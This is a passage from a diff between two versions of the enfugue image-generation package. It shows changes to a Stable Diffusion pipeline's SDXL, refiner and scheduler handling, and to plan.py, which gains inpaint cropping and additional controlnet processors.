                         batch_size,
                         num_channels_latents,
                         height,
                         width,
-                        encoded_prompt_embeds.dtype,
+                        prompt_embeds.dtype,
                         device,
                         generator,
+                        scheduler=scheduler,
                     )
 
                 prepared_mask, prepared_image_latents = self.prepare_mask_latents(
                     prepared_mask,
                     prepared_image,
                     batch_size,
                     height,
                     width,
-                    encoded_prompt_embeds.dtype,
+                    prompt_embeds.dtype,
                     device,
                     generator,
                     do_classifier_free_guidance,
                     progress_callback=step_complete,
                 )
 
                 num_channels_mask = prepared_mask.shape[1]
                 num_channels_masked_image = prepared_image_latents.shape[1]
 
-                if (
-                    num_channels_latents + num_channels_mask + num_channels_masked_image
-                    != self.unet.config.in_channels
-                ):
+                if num_channels_latents + num_channels_mask + num_channels_masked_image != self.unet.config.in_channels:
                     raise ValueError(
                         f"Incorrect configuration settings! The config of `pipeline.unet`: {self.unet.config} expects"
                         f" {self.unet.config.in_channels} but received `num_channels_latents`: {num_channels_latents} +"
                         f" `num_channels_mask`: {num_channels_mask} + `num_channels_masked_image`: {num_channels_masked_image}"
                         f" = {num_channels_latents+num_channels_masked_image+num_channels_mask}. Please verify the config of"
                         " `pipeline.unet` or your `mask_image` or `image` input."
                     )
             elif prepared_image is not None:
                 # Running the pipeline on an image, start with that
                 prepared_latents = self.prepare_image_latents(
                     prepared_image,
                     timesteps[:1].repeat(batch_size),
                     batch_size,
-                    encoded_prompt_embeds.dtype,
+                    prompt_embeds.dtype,
                     device,
                     generator,
                     progress_callback=step_complete,
+                    scheduler=scheduler,
                 )
             elif latents:
                 # Running the pipeline on existing latents, add some noise
-                prepared_latents = latents.to(device) * self.self.scheduler.init_noise_sigma
+                prepared_latents = latents.to(device) * scheduler.init_noise_sigma
             else:
                 # Create random latents for the whole unet
                 prepared_latents = self.create_latents(
                     batch_size,
                     self.unet.config.in_channels,
                     height,
                     width,
-                    encoded_prompt_embeds.dtype,
+                    prompt_embeds.dtype,
                     device,
                     generator,
+                    scheduler=scheduler,
                 )
 
             # Look for controlnet and conditioning image
             if control_image is not None:
                 if self.controlnet is None:
                     logger.warning("Control image passed, but no controlnet present. Ignoring.")
                     prepared_control_image = None
@@ -1574,78 +2013,128 @@
                         num_images_per_prompt=num_images_per_prompt,
                         device=device,
                         dtype=self.controlnet.dtype,
                         do_classifier_free_guidance=do_classifier_free_guidance,
                     )
             elif self.controlnet is not None:
                 if image and mask:
-                    logger.info(
-                        "Assuming controlnet inpaint, creating conditioning image from image and mask"
-                    )
+                    logger.info("Assuming controlnet inpaint, creating conditioning image from image and mask")
                     prepared_control_image = self.prepare_controlnet_inpaint_control_image(
                         image=image, mask=image, device=device, dtype=self.controlnet.dtype
                     )
                 else:
                     self.controlnet = self.controlnet.to("cpu")
-                    logger.warning(
-                        "Controlnet present, but no conditioning image. Disabling controlnet."
-                    )
+                    logger.warning("Controlnet present, but no conditioning image. Disabling controlnet.")
 
             # Should no longer be None
             prepared_latents = cast(torch.Tensor, prepared_latents)
 
             # 6. Prepare extra step kwargs.
-            extra_step_kwargs = self.prepare_extra_step_kwargs(generator, eta)
+            extra_step_kwargs = self.prepare_extra_step_kwargs(scheduler, generator, eta)
 
             # Make sure controlnet on device
             if self.controlnet is not None:
                 self.controlnet = self.controlnet.to(device=device)
 
-            # 7. Denoising loop
+            # 7. Prepared added time IDs and embeddings (SDXL)
+            if self.is_sdxl:
+                negative_prompt_embeds = cast(torch.Tensor, negative_prompt_embeds)
+                pooled_prompt_embeds = cast(torch.Tensor, pooled_prompt_embeds)
+                negative_pooled_prompt_embeds = cast(torch.Tensor, negative_pooled_prompt_embeds)
+                add_text_embeds = pooled_prompt_embeds
+                if do_classifier_free_guidance:
+                    prompt_embeds = torch.cat([negative_prompt_embeds, prompt_embeds], dim=0)
+                    add_text_embeds = torch.cat([negative_pooled_prompt_embeds, add_text_embeds], dim=0)
+                if self.config.requires_aesthetic_score:
+                    add_time_ids, add_neg_time_ids = self.get_add_time_ids(
+                        original_size=original_size,
+                        crops_coords_top_left=crops_coords_top_left,
+                        target_size=target_size,
+                        dtype=prompt_embeds.dtype,
+                        aesthetic_score=aesthetic_score,
+                        negative_aesthetic_score=negative_aesthetic_score,
+                    )
+                    if do_classifier_free_guidance:
+                        add_time_ids = torch.cat([add_neg_time_ids, add_time_ids], dim=0)
+                else:
+                    add_time_ids, _ = self.get_add_time_ids(
+                        original_size=original_size,
+                        crops_coords_top_left=crops_coords_top_left,
+                        target_size=target_size,
+                        dtype=prompt_embeds.dtype,
+                    )
+                    add_time_ids = torch.cat([add_time_ids, add_time_ids], dim=0)
+
+                prompt_embeds = prompt_embeds.to(device)
+                add_text_embeds = add_text_embeds.to(device)
+                add_time_ids = add_time_ids.to(device).repeat(batch_size * num_images_per_prompt, 1)
+                added_cond_kwargs = {"text_embeds": add_text_embeds, "time_ids": add_time_ids}
+            else:
+                added_cond_kwargs = None
+
+            # 8. Denoising loop
             prepared_latents = self.denoise(
                 height=height,
                 width=width,
                 device=device,
                 num_inference_steps=num_inference_steps,
                 timesteps=timesteps,
                 latents=prepared_latents,
-                encoded_prompt_embeds=encoded_prompt_embeds,
+                prompt_embeds=prompt_embeds,
                 conditioning_scale=conditioning_scale,
                 guidance_scale=guidance_scale,
                 do_classifier_free_guidance=do_classifier_free_guidance,
                 mask=prepared_mask,
                 mask_image=prepared_image_latents,
                 control_image=prepared_control_image,
                 progress_callback=step_complete,
                 latent_callback=latent_callback,
                 latent_callback_steps=latent_callback_steps,
                 latent_callback_type=latent_callback_type,
                 extra_step_kwargs=extra_step_kwargs,
                 cross_attention_kwargs=cross_attention_kwargs,
+                added_cond_kwargs=added_cond_kwargs,
             )
 
             # Clear no longer needed tensors
             del prepared_mask
             del prepared_image_latents
             del prepared_control_image
 
             if output_type != "latent":
-                prepared_latents = self.decode_latents(
-                    prepared_latents, device=device, progress_callback=step_complete
-                )
+                if self.is_sdxl:
+                    # make sure the VAE is in float32 mode, as it overflows in float16
+                    self.vae.to(dtype=torch.float32)
+                if self.is_sdxl:
+                    use_torch_2_0_or_xformers = self.vae.decoder.mid_block.attentions[0].processor in [
+                        AttnProcessor2_0,
+                        XFormersAttnProcessor,
+                        LoRAXFormersAttnProcessor,
+                        LoRAAttnProcessor2_0,
+                    ]
+                    # if xformers or torch_2_0 is used attention block does not need
+                    # to be in float32 which can save lots of memory
+                    if not use_torch_2_0_or_xformers:
+                        self.vae.post_quant_conv.to(prepared_latents.dtype)
+                        self.vae.decoder.conv_in.to(prepared_latents.dtype)
+                        self.vae.decoder.mid_block.to(prepared_latents.dtype)
+                    else:
+                        prepared_latents = prepared_latents.float()
+
+                prepared_latents = self.decode_latents(prepared_latents, device=device, progress_callback=step_complete)
 
+                if self.is_sdxl:
+                    self.vae.to(dtype=prepared_latents.dtype)
         if output_type == "latent":
             output = prepared_latents
         else:
             output = self.denormalize_latents(prepared_latents)
             if output_type != "pt":
                 output = self.image_processor.pt_to_numpy(output)
-                output_nsfw = self.run_safety_checker(output, device, encoded_prompt_embeds.dtype)[
-                    1
-                ]
+                output_nsfw = self.run_safety_checker(output, device, prompt_embeds.dtype)[1]
                 if output_type == "pil":
                     output = self.image_processor.numpy_to_pil(output)
 
         if hasattr(self, "final_offload_hook") and self.final_offload_hook is not None:
             self.final_offload_hook.offload()
 
         if self.controlnet is not None:
```

### Comparing `enfugue-0.1.3/enfugue/diffusion/plan.py` & `enfugue-0.2.0/enfugue/diffusion/plan.py`

 * *Files 22% similar despite different names*

```diff
@@ -9,126 +9,143 @@
 from typing import (
     Optional,
     Dict,
     Any,
     Union,
     Tuple,
     List,
-    Literal,
     Callable,
     TypedDict,
     TYPE_CHECKING,
 )
 
-from enfugue.util import logger, feather_mask, fit_image, remove_background, TokenMerger
+from enfugue.util import (
+    logger,
+    feather_mask,
+    fit_image,
+    remove_background,
+    TokenMerger,
+    IMAGE_FIT_LITERAL,
+    IMAGE_ANCHOR_LITERAL,
+)
 
 if TYPE_CHECKING:
     from enfugue.diffusers.manager import DiffusionPipelineManager
     from diffusers.pipelines.stable_diffusion import StableDiffusionPipelineOutput
+    from enfugue.diffusion.constants import (
+        SCHEDULER_LITERAL,
+        MULTI_SCHEDULER_LITERAL,
+        CONTROLNET_LITERAL,
+        VAE_LITERAL,
+        UPSCALE_LITERAL,
+    )
 
 DEFAULT_SIZE = 512
 DEFAULT_IMAGE_CALLBACK_STEPS = 10
 DEFAULT_CONDITIONING_SCALE = 1.0
-DEFAULT_CHUNKING_SIZE = 64
-DEFAULT_CHUNKING_BLUR = 64
 DEFAULT_IMG2IMG_STRENGTH = 0.8
 DEFAULT_INFERENCE_STEPS = 50
 DEFAULT_GUIDANCE_SCALE = 7.5
-DEFAULT_UPSCALE_PROMPT = (
-    "highly detailed, ultra-detailed, intricate detail, high definition, HD, 4k, ultra high def"
-)
-DEFAULT_UPSCALE_NEGATIVE_PROMPT = "blurry, out-of-focus, ugly, pixelated, artifacts"
+DEFAULT_UPSCALE_PROMPT = "highly detailed, ultra-detailed, intricate detail, high definition, HD, 4k, 8k UHD"
+DEFAULT_UPSCALE_NEGATIVE_PROMPT = ""
 DEFAULT_UPSCALE_DIFFUSION_STEPS = 100
 DEFAULT_UPSCALE_DIFFUSION_GUIDANCE_SCALE = 12
 DEFAULT_UPSCALE_DIFFUSION_STRENGTH = 0.2
-DEFAULT_UPSCALE_DIFFUSION_CHUNKING_SIZE = 64
-DEFAULT_UPSCALE_DIFFUSION_CHUNKING_BLUR = 64
+
+DEFAULT_REFINER_STRENGTH = 0.3
+DEFAULT_REFINER_GUIDANCE_SCALE = 5.0
+DEFAULT_AESTHETIC_SCORE = 6.0
+DEFAULT_NEGATIVE_AESTHETIC_SCORE = 2.5
 
 MODEL_PROMPT_WEIGHT = 0.2
 GLOBAL_PROMPT_STEP_WEIGHT = 0.4
 GLOBAL_PROMPT_UPSCALE_WEIGHT = 0.4
 UPSCALE_PROMPT_STEP_WEIGHT = 0.1
 MAX_IMAGE_SCALE = 3.0
 
-__all__ = ["DiffusionStep", "DiffusionPlan"]
+__all__ = ["NodeDict", "DiffusionStep", "DiffusionPlan"]
 
 
 class NodeDict(TypedDict):
     w: int
     h: int
     x: int
     y: int
-    fit: Optional[Literal["actual", "stretch", "contain", "cover"]]
-    anchor: Optional[
-        Literal[
-            "top-left",
-            "top-center",
-            "top-right",
-            "center-left",
-            "center-center",
-            "center-right",
-            "bottom-left",
-            "bottom-center",
-            "bottom-right",
-        ]
-    ]
+    fit: Optional[IMAGE_FIT_LITERAL]
+    anchor: Optional[IMAGE_ANCHOR_LITERAL]
     infer: Optional[bool]
     inpaint: Optional[bool]
     control: Optional[bool]
     controlnet: Optional[str]
     prompt: Optional[str]
     negative_prompt: Optional[str]
     strength: Optional[float]
     conditioning_scale: Optional[float]
     image: Optional[PIL.Image.Image]
     mask: Optional[PIL.Image.Image]
+    process_control_image: Optional[bool]
+    remove_background: Optional[bool]
+    invert: Optional[bool]
+    invert_mask: Optional[bool]
 
 
 class DiffusionStep:
     """
     A step represents most of the inputs to describe what the image is and how to control inference
     """
 
     result: StableDiffusionPipelineOutput
+    crop_inpaint: bool = True
+    inpaint_feather: int = 16
 
     def __init__(
         self,
         width: Optional[int] = None,
         height: Optional[int] = None,
         prompt: Optional[str] = None,
         negative_prompt: Optional[str] = None,
         image: Optional[Union[DiffusionStep, PIL.Image.Image, str]] = None,
         mask: Optional[Union[DiffusionStep, PIL.Image.Image, str]] = None,
         control_image: Optional[Union[DiffusionStep, PIL.Image.Image, str]] = None,
-        controlnet: Optional[Literal["canny", "tile", "mlsd", "hed", "scribble", "inpaint"]] = None,
+        controlnet: Optional[CONTROLNET_LITERAL] = None,
         conditioning_scale: Optional[float] = DEFAULT_CONDITIONING_SCALE,
         strength: Optional[float] = DEFAULT_IMG2IMG_STRENGTH,
         num_inference_steps: Optional[int] = DEFAULT_INFERENCE_STEPS,
         guidance_scale: Optional[float] = DEFAULT_GUIDANCE_SCALE,
+        refiner_strength: Optional[float] = DEFAULT_REFINER_STRENGTH,
+        refiner_guidance_scale: Optional[float] = DEFAULT_REFINER_GUIDANCE_SCALE,
+        refiner_aesthetic_score: Optional[float] = DEFAULT_AESTHETIC_SCORE,
+        refiner_negative_aesthetic_score: Optional[float] = DEFAULT_NEGATIVE_AESTHETIC_SCORE,
         remove_background: bool = False,
         process_control_image: bool = True,
         scale_to_model_size: bool = True,
     ) -> None:
         self.width = width
         self.height = height
         self.prompt = prompt
         self.negative_prompt = negative_prompt
         self.image = image
         self.mask = mask
         self.control_image = control_image
         self.controlnet = controlnet
         self.strength = strength if strength is not None else DEFAULT_IMG2IMG_STRENGTH
-        self.conditioning_scale = (
-            conditioning_scale if conditioning_scale is not None else DEFAULT_CONDITIONING_SCALE
+        self.conditioning_scale = conditioning_scale if conditioning_scale is not None else DEFAULT_CONDITIONING_SCALE
+        self.num_inference_steps = num_inference_steps if num_inference_steps is not None else DEFAULT_INFERENCE_STEPS
+        self.guidance_scale = guidance_scale if guidance_scale is not None else DEFAULT_GUIDANCE_SCALE
+        self.refiner_strength = refiner_strength if refiner_strength is not None else DEFAULT_REFINER_STRENGTH
+        self.refiner_guidance_scale = (
+            refiner_guidance_scale if refiner_guidance_scale is not None else DEFAULT_REFINER_GUIDANCE_SCALE
         )
-        self.num_inference_steps = (
-            num_inference_steps if num_inference_steps is not None else DEFAULT_INFERENCE_STEPS
+        self.refiner_aesthetic_score = (
+            refiner_aesthetic_score if refiner_aesthetic_score is not None else DEFAULT_AESTHETIC_SCORE
         )
-        self.guidance_scale = (
-            guidance_scale if guidance_scale is not None else DEFAULT_GUIDANCE_SCALE
+        self.refiner_negative_aesthetic_score = (
+            refiner_negative_aesthetic_score
+            if refiner_negative_aesthetic_score is not None
+            else DEFAULT_NEGATIVE_AESTHETIC_SCORE
         )
         self.remove_background = remove_background
         self.process_control_image = process_control_image
         self.scale_to_model_size = scale_to_model_size
 
     def get_serialization_dict(self) -> Dict[str, Any]:
         """
@@ -141,14 +158,18 @@
             "negative_prompt": self.negative_prompt,
             "controlnet": self.controlnet,
             "conditioning_scale": self.conditioning_scale,
             "strength": self.strength,
             "num_inference_steps": self.num_inference_steps,
             "guidance_scale": self.guidance_scale,
             "remove_background": self.remove_background,
+            "refiner_strength": self.refiner_strength,
+            "refiner_guidance_scale": self.refiner_guidance_scale,
+            "refiner_aesthetic_score": self.refiner_aesthetic_score,
+            "refiner_negative_aesthetic_score": self.refiner_negative_aesthetic_score,
             "process_control_image": self.process_control_image,
             "scale_to_model_size": self.scale_to_model_size,
         }
 
         serialize_children: List[DiffusionStep] = []
         for key in ["image", "mask", "control_image"]:
             child = getattr(self, key)
@@ -176,31 +197,119 @@
             "negative_prompt": self.negative_prompt,
             "image": self.image,
             "control_image": self.control_image,
             "conditioning_scale": self.conditioning_scale,
             "strength": self.strength,
             "num_inference_steps": self.num_inference_steps,
             "guidance_scale": self.guidance_scale,
+            "refiner_strength": self.refiner_strength,
+            "refiner_guidance_scale": self.refiner_guidance_scale,
+            "refiner_aesthetic_score": self.refiner_aesthetic_score,
+            "refiner_negative_aesthetic_score": self.refiner_negative_aesthetic_score,
         }
 
+    def get_inpaint_bounding_box(self, pipeline_size: int) -> List[Tuple[int, int]]:
+        """
+        Gets the bounding box of places inpainted
+        """
+        if isinstance(self.mask, str):
+            mask = PIL.Image.open(self.mask)
+        elif isinstance(self.mask, PIL.Image.Image):
+            mask =self.mask
+        else:
+            raise ValueError("Cannot get bounding box for empty or dynamic mask.")
+        
+        width, height = mask.size
+        x0, y0, x1, y1 = mask.getbbox()
+
+        # Add feather
+        x0 = max(0, x0 - self.inpaint_feather)
+        x1 = min(width - 1, x1 + self.inpaint_feather)
+        y0 = max(0, y0 - self.inpaint_feather)
+        y1 = min(height - 1, y1 + self.inpaint_feather)
+
+        # Create centered frame about the bounding box
+        bbox_width = x1 - x0
+        bbox_height = y1 - y0
+        if bbox_width < pipeline_size:
+            x0 = max(0, x0 - ((pipeline_size - bbox_width) // 2))
+            x1 = min(width - 1, x0 + pipeline_size)
+            x0 = max(0, x1 - pipeline_size)
+        if bbox_height < pipeline_size:
+            y0 = max(0, y0 - ((pipeline_size - bbox_height) // 2))
+            y1 = min(width - 1, y0 + pipeline_size)
+            y0 = max(0, y1 - pipeline_size)
+        return [(x0, y0), (x1, y1)]
+
+    def paste_inpaint_image(
+        self, background: PIL.Image.Image, foreground: PIL.Image.Image, position: Tuple[int, int]
+    ) -> PIL.Image.Image:
+        """
+        Pastes the inpaint image on the background with an appropriately feathered mask.
+        """
+        image = background.copy()
+
+        width, height = image.size
+        foreground_width, foreground_height = foreground.size
+        left, top = position
+        right, bottom = left + foreground_width, top + foreground_height
+
+        feather_left = left > 0
+        feather_top = top > 0
+        feather_right = right < width
+        feather_bottom = bottom < height
+
+        mask = PIL.Image.new("L", (foreground_width, foreground_height), 255)
+
+        for i in range(self.inpaint_feather):
+            multiplier = (i + 1) / (self.inpaint_feather + 1)
+            pixels = []
+            if feather_left:
+                pixels.extend([(i, j) for j in range(foreground_height)])
+            if feather_top:
+                pixels.extend([(j, i) for j in range(foreground_width)])
+            if feather_right:
+                pixels.extend([(foreground_width - i - 1, j) for j in range(foreground_height)])
+            if feather_bottom:
+                pixels.extend([(j, foreground_height - i - 1) for j in range(foreground_width)])
+            for x, y in pixels:
+                mask.putpixel((x, y), int(mask.getpixel((x, y)) * multiplier))
+
+        image.paste(foreground, position, mask=mask)
+        return image
+
     def check_process_control_image(
         self, pipeline: DiffusionPipelineManager, control_image: Optional[PIL.Image.Image]
     ) -> Optional[PIL.Image.Image]:
         """
         Gets the control image for the pipeline based on the requested controlnet
         """
         if self.controlnet is None or control_image is None:
             return None
         if self.process_control_image:
             if self.controlnet == "canny":
                 return pipeline.edge_detector.canny(control_image)
-            if self.controlnet == "mlsd":
-                return pipeline.edge_detector.mlsd(control_image)
             if self.controlnet == "hed":
                 return pipeline.edge_detector.hed(control_image)
+            if self.controlnet == "scribble":
+                return pipeline.edge_detector.hed(control_image, scribble=True)
+            if self.controlnet == "pidi":
+                return pipeline.edge_detector.pidi(control_image)
+            if self.controlnet == "depth":
+                return pipeline.depth_detector.midas(control_image)
+            if self.controlnet == "normal":
+                return pipeline.depth_detector.normal(control_image)
+            if self.controlnet == "pose":
+                return pipeline.pose_detector.detect(control_image)
+            if self.controlnet == "line":
+                return pipeline.line_detector.detect(control_image)
+            if self.controlnet == "anime":
+                return pipeline.line_detector.detect(control_image, anime=True)
+            if self.controlnet == "mlsd":
+                return pipeline.line_detector.mlsd(control_image)
         return control_image
 
     def execute(
         self,
         pipeline: DiffusionPipelineManager,
         **kwargs: Any,
     ) -> StableDiffusionPipelineOutput:
@@ -244,67 +353,103 @@
                 return self.result
             raise ValueError("No prompt or image in this step; cannot invoke or pass through.")
 
         pipeline.controlnet = self.controlnet
         invocation_kwargs = {**kwargs, **self.kwargs}
 
         image_scale = 1
-        image_width, image_height = None, None
+        pipeline_size = pipeline.size if mask is None else pipeline.inpainter_size
+        image_width, image_height, image_background, image_position = None, None, None, None
 
         if image is not None:
             image_width, image_height = image.size
             invocation_kwargs["image"] = image
         if control_image is not None:
             if image is not None:
                 assert image.size == control_image.size
             else:
                 image_width, image_height = control_image.size
             invocation_kwargs["control_image"] = control_image
         if mask is not None:
+            mask_width, mask_height = mask.size
+            if (
+                self.crop_inpaint
+                and (mask_width > pipeline_size or mask_height > pipeline.size)
+                and image is not None
+                and control_image is None
+            ):
+                (x0, y0), (x1, y1) = self.get_inpaint_bounding_box(pipeline_size)
+                bbox_width = x1 - x0
+                bbox_height = y1 - y0
+                pixel_ratio = (bbox_height * bbox_width) / (mask_width * mask_height)
+                pixel_savings = (1.0 - pixel_ratio) * 100
+                if pixel_ratio < 0.75:
+                    logger.debug(f"Calculated pixel area savings of {pixel_savings:.1f}% by cropping prior to inpaint")
+                    # Disable refining
+                    invocation_kwargs["refiner_strength"] = 0
+                    image_position = (x0, y0)
+                    image_background = image.copy()
+                    image = image.crop((x0, y0, x1, y1))
+                    mask = mask.crop((x0, y0, x1, y1))
+                    image_width, image_height = bbox_width, bbox_height
+                    invocation_kwargs["image"] = image  # Override what was set above
+                else:
+                    logger.debug(
+                        f"Calculated pixel area savings of {pixel_savings:.1f}% are insufficient, will not crop"
+                    )
             invocation_kwargs["mask"] = mask
             if image is not None:
                 assert image.size == mask.size
             if control_image is not None:
                 assert control_image.size == mask.size
             else:
                 image_width, image_height = mask.size
-        if (
-            self.width is not None
-            and self.height is not None
-            and image_width is None
-            and image_height is None
-        ):
+
+        if self.width is not None and self.height is not None and image_width is None and image_height is None:
             image_width, image_height = self.width, self.height
 
         if image_width is None or image_height is None:
-            raise ValueError("No known invocation size.")
+            logger.warning("No known invocation size, defaulting to engine size")
+            image_width, image_height = pipeline_size, pipeline_size
 
-        if image_width is not None and image_width < pipeline.size:
-            image_scale = pipeline.size / image_width
-        if image_height is not None and image_height < pipeline.size:
-            image_scale = max(image_scale, pipeline.size / image_height)
+        if image_width is not None and image_width < pipeline_size:
+            image_scale = pipeline_size / image_width
+        if image_height is not None and image_height < pipeline_size:
+            image_scale = max(image_scale, pipeline_size / image_height)
 
         if image_scale > MAX_IMAGE_SCALE or not self.scale_to_model_size:
             # Refuse it's too oblong. We'll just calculate at the appropriate size.
             image_scale = 1
 
         invocation_kwargs["width"] = 8 * round((image_width * image_scale) / 8)
         invocation_kwargs["height"] = 8 * round((image_height * image_scale) / 8)
-        invocation_kwargs["control_image"] = self.check_process_control_image(
-            pipeline, control_image
-        )
+        invocation_kwargs["control_image"] = self.check_process_control_image(pipeline, control_image)
 
         if image_scale > 1:
             # scale input images up
             for key in ["image", "mask", "control_image"]:
                 if invocation_kwargs.get(key, None) is not None:
                     invocation_kwargs[key] = self.scale_image(invocation_kwargs[key], image_scale)
 
+        latent_callback = invocation_kwargs.get("latent_callback", None)
+        if image_background is not None and image_position is not None and latent_callback is not None:
+            # Hijack latent callback to paste onto background
+            def pasted_latent_callback(images: List[PIL.Image.Image]) -> None:
+                images = [self.paste_inpaint_image(image_background, image, image_position) for image in images] # type: ignore
+                latent_callback(images)
+
+            invocation_kwargs["latent_callback"] = pasted_latent_callback
+            invocation_kwargs["latent_callback_steps"] = 5
+
         result = pipeline(**invocation_kwargs)
 
+        if image_background is not None and image_position is not None:
+            for i, image in enumerate(result["images"]):
+                result["images"][i] = self.paste_inpaint_image(image_background, image, image_position)
+
         if self.remove_background:
             for i, image in enumerate(result["images"]):
                 result["images"][i] = remove_background(image)
 
         if image_scale > 1:
             for i, image in enumerate(result["images"]):
                 result["images"][i] = self.scale_image(image, 1 / image_scale)
@@ -332,26 +477,28 @@
             "prompt",
             "negative_prompt",
             "controlnet",
             "conditioning_scale",
             "strength",
             "num_inference_steps",
             "guidance_scale",
+            "refiner_strength",
+            "refiner_guidance_scale",
+            "refiner_aesthetic_score",
+            "refiner_negative_aesthetic_score",
             "width",
             "height",
             "remove_background",
             "process_control_image",
             "scale_to_model_size",
         ]:
             if key in step_dict:
                 kwargs[key] = step_dict[key]
 
-        deserialized_children = [
-            DiffusionStep.deserialize_dict(child) for child in step_dict.get("children", [])
-        ]
+        deserialized_children = [DiffusionStep.deserialize_dict(child) for child in step_dict.get("children", [])]
         for key in ["image", "control_image", "mask"]:
             if key not in step_dict:
                 continue
             if isinstance(step_dict[key], int):
                 kwargs[key] = deserialized_children[step_dict[key]]
             else:
                 kwargs[key] = step_dict[key]
@@ -417,134 +564,100 @@
     with an empty steps array and initial image.
     """
 
     def __init__(
         self,
         prompt: Optional[str] = None,  # Global
         negative_prompt: Optional[str] = None,  # Global
-        size: Optional[int] = DEFAULT_SIZE,
+        size: Optional[int] = None,
+        refiner_size: Optional[int] = None,
+        inpainter_size: Optional[int] = None,
         model: Optional[str] = None,
-        lora: Optional[
-            Union[str, List[str], Tuple[str, float], List[Union[str, Tuple[str, float]]]]
-        ] = None,
+        refiner: Optional[str] = None,
+        inpainter: Optional[str] = None,
+        lora: Optional[Union[str, List[str], Tuple[str, float], List[Union[str, Tuple[str, float]]]]] = None,
+        lycoris: Optional[Union[str, List[str], Tuple[str, float], List[Union[str, Tuple[str, float]]]]] = None,
         inversion: Optional[Union[str, List[str]]] = None,
-        width: Optional[int] = DEFAULT_SIZE,
-        height: Optional[int] = DEFAULT_SIZE,
+        scheduler: Optional[SCHEDULER_LITERAL] = None,
+        multi_scheduler: Optional[MULTI_SCHEDULER_LITERAL] = None,
+        vae: Optional[VAE_LITERAL] = None,
+        width: Optional[int] = None,
+        height: Optional[int] = None,
         image_callback_steps: Optional[int] = DEFAULT_IMAGE_CALLBACK_STEPS,
         nodes: List[DiffusionNode] = [],
         image: Optional[Union[str, PIL.Image.Image]] = None,
-        chunking_size: Optional[int] = DEFAULT_CHUNKING_SIZE,
-        chunking_blur: Optional[int] = DEFAULT_CHUNKING_BLUR,
+        chunking_size: Optional[int] = None,
+        chunking_blur: Optional[int] = None,
         samples: Optional[int] = 1,
         seed: Optional[int] = None,
         build_tensorrt: bool = False,
         outscale: Optional[int] = 1,
-        upscale: Optional[
-            Union[
-                Literal[
-                    "esrgan",
-                    "esrganime",
-                    "gfpgan",
-                    "lanczos",
-                    "bilinear",
-                    "bicubic",
-                    "lanczos",
-                    "nearest",
-                ],
-                List[
-                    Literal[
-                        "esrgan",
-                        "esrganime",
-                        "gfpgan",
-                        "lanczos",
-                        "bilinear",
-                        "bicubic",
-                        "lanczos",
-                        "nearest",
-                    ]
-                ],
-            ]
-        ] = None,
+        upscale: Optional[Union[UPSCALE_LITERAL, List[UPSCALE_LITERAL]]] = None,
         upscale_diffusion: bool = False,
         upscale_iterative: bool = False,
         upscale_diffusion_steps: Optional[Union[int, List[int]]] = DEFAULT_UPSCALE_DIFFUSION_STEPS,
         upscale_diffusion_guidance_scale: Optional[
             Union[float, int, List[Union[float, int]]]
         ] = DEFAULT_UPSCALE_DIFFUSION_GUIDANCE_SCALE,
-        upscale_diffusion_strength: Optional[
-            Union[float, List[float]]
-        ] = DEFAULT_UPSCALE_DIFFUSION_STRENGTH,
+        upscale_diffusion_strength: Optional[Union[float, List[float]]] = DEFAULT_UPSCALE_DIFFUSION_STRENGTH,
         upscale_diffusion_prompt: Optional[Union[str, List[str]]] = DEFAULT_UPSCALE_PROMPT,
-        upscale_diffusion_negative_prompt: Optional[
-            Union[str, List[str]]
-        ] = DEFAULT_UPSCALE_NEGATIVE_PROMPT,
-        upscale_diffusion_controlnet: Optional[
-            Union[
-                Literal["canny", "tile", "mlsd", "hed", "scribble", "inpaint"],
-                List[Literal["canny", "tile", "mlsd", "hed", "scribble", "inpaint"]],
-            ]
-        ] = None,
-        upscale_diffusion_chunking_size: Optional[int] = DEFAULT_UPSCALE_DIFFUSION_CHUNKING_SIZE,
-        upscale_diffusion_chunking_blur: Optional[int] = DEFAULT_UPSCALE_DIFFUSION_CHUNKING_BLUR,
+        upscale_diffusion_negative_prompt: Optional[Union[str, List[str]]] = DEFAULT_UPSCALE_NEGATIVE_PROMPT,
+        upscale_diffusion_controlnet: Optional[Union[CONTROLNET_LITERAL, List[CONTROLNET_LITERAL]]] = None,
+        upscale_diffusion_chunking_size: Optional[int] = None,
+        upscale_diffusion_chunking_blur: Optional[int] = None,
         upscale_diffusion_scale_chunking_size: bool = True,
         upscale_diffusion_scale_chunking_blur: bool = True,
     ) -> None:
-        self.size = size if size is not None else DEFAULT_SIZE
+        self.size = size if size is not None else (1024 if model is not None and "xl" in model.lower() else 512)
+        self.inpainter_size = inpainter_size
+        self.refiner_size = refiner_size
         self.prompt = prompt
         self.negative_prompt = negative_prompt
         self.model = model
+        self.refiner = refiner
+        self.inpainter = inpainter
         self.lora = lora
+        self.lycoris = lycoris
         self.inversion = inversion
-        self.width = width if width is not None else DEFAULT_SIZE
-        self.height = height if height is not None else DEFAULT_SIZE
+        self.scheduler = scheduler
+        self.multi_scheduler = multi_scheduler
+        self.vae = vae
+        self.width = width if width is not None else self.size
+        self.height = height if height is not None else self.size
         self.image = image
         self.image_callback_steps = image_callback_steps
-        self.chunking_size = (
-            chunking_size if chunking_size is not None else DEFAULT_CHUNKING_SIZE
-        )  # Pass 0 to disable
-        self.chunking_blur = (
-            chunking_blur if chunking_blur is not None else DEFAULT_CHUNKING_BLUR
-        )  # Pass 0 to disable
+        self.chunking_size = chunking_size if chunking_size is not None else self.size // 8  # Pass 0 to disable
+        self.chunking_blur = chunking_blur if chunking_blur is not None else self.size // 8  # Pass 0 to disable
         self.samples = samples if samples is not None else 1
         self.seed = seed
         self.build_tensorrt = build_tensorrt
         self.nodes = nodes
         self.outscale = outscale if outscale is not None else 1
         self.upscale = upscale
         self.upscale_iterative = bool(upscale_iterative)
         self.upscale_diffusion = bool(upscale_diffusion)
         self.upscale_diffusion_chunking_size = (
-            upscale_diffusion_chunking_size
-            if upscale_diffusion_chunking_size is not None
-            else DEFAULT_UPSCALE_DIFFUSION_CHUNKING_SIZE
+            upscale_diffusion_chunking_size if upscale_diffusion_chunking_size is not None else self.size // 4
         )
         self.upscale_diffusion_chunking_blur = (
-            upscale_diffusion_chunking_blur
-            if upscale_diffusion_chunking_blur is not None
-            else DEFAULT_UPSCALE_DIFFUSION_CHUNKING_BLUR
+            upscale_diffusion_chunking_blur if upscale_diffusion_chunking_blur is not None else self.size // 4
         )
         self.upscale_diffusion_guidance_scale = (
             upscale_diffusion_guidance_scale
             if upscale_diffusion_guidance_scale is not None
             else DEFAULT_UPSCALE_DIFFUSION_GUIDANCE_SCALE
         )
         self.upscale_diffusion_steps = (
-            upscale_diffusion_steps
-            if upscale_diffusion_steps is not None
-            else DEFAULT_UPSCALE_DIFFUSION_STEPS
